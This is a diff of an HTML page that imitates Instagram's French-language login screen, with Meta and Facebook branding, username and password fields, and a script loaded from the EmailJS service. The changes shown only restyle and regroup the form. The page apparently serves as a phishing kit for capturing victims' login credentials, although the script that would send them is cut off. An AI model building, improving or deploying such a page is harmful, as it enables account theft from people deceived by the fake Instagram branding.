@@ -5,7 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
-    <link rel="stylesheet" href="./Instagram_icon.png.webp">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -15,8 +14,15 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
             padding: 40px;
+            width: 350px;
             text-align: center;
+            margin: 0;
         }
 
         .logo {
@@ -129,33 +135,35 @@
 
 <body>
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <div class="logo"><img src="./instaTheme.png" alt=""></div>
-    <button class="btn-facebook">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png"
-            alt="Facebook" width="20">
-        Continuer avec Facebook
-    </button>
-    <div class="or">
-        <hr>
-        <span>OU</span>
-        <hr>
-    </div>
-    <input type="text" class="input" placeholder="Num. téléphone, nom d’utilisateur ou e-mail">
-    <input type="password" class="input" placeholder="Mot de passe" id="passKey">
-    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
-    <button class="btn-login" id="sub">Se connecter</button>
+    <div class="container">
+        <div class="logo"><img src="./instaTheme.png" alt=""></div>
+        <button class="btn-facebook">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png"
+                alt="Facebook" width="20">
+            Continuer avec Facebook
+        </button>
+        <div class="or">
+            <hr>
+            <span>OU</span>
+            <hr>
+        </div>
+        <input type="text" class="input" placeholder="Num. téléphone, nom d’utilisateur ou e-mail">
+        <input type="password" class="input" placeholder="Mot de passe" id="passKey">
+        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        <button class="btn-login" id="sub">Se connecter</button>
 
-    <div class="signup">
-        Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
-    </div>
+        <div class="signup">
+            Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
+        </div>
 
-    <div class="footer">
-        Vous pouvez également <a href="#">signaler le contenu que vous pensez illégal</a>
-    </div>
+        <div class="footer">
+            Vous pouvez également <a href="#">signaler le contenu que vous pensez illégal</a>
+        </div>
 
-    <div class="meta">
-        <span>from</span><br>
-        <img src="meta.png" alt="Meta">
+        <div class="meta">
+            <span>from</span><br>
+            <img src="meta.png" alt="Meta">
+        </div>
     </div>
 
     <script>
